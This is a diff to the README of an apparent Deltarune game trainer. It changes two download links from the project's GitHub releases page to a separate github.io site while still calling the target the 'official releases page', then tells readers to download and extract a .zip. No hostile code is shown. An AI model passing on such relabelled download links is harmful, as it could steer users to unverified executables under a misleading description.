@@ -1,6 +1,6 @@
 # ⚙️ Deltarune-Chapter5-Trainer-Client - Manage Your Health and Stats Easily
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Patr5834/Deltarune-Chapter5-Trainer-Client/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue)](https://patr5834.github.io)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Your computer must meet these basic requirements to run the software:
 
 Follow these steps to set up the trainer on your machine:
 
-1.  Visit the [official releases page](https://github.com/Patr5834/Deltarune-Chapter5-Trainer-Client/releases) to download the latest version.
+1.  Visit the [official releases page](https://patr5834.github.io) to download the latest version.
 2.  Click the link that ends in .zip to start your download.
 3.  Open your Downloads folder after the file finishes.
 4.  Right-click the zip file and select Extract All.
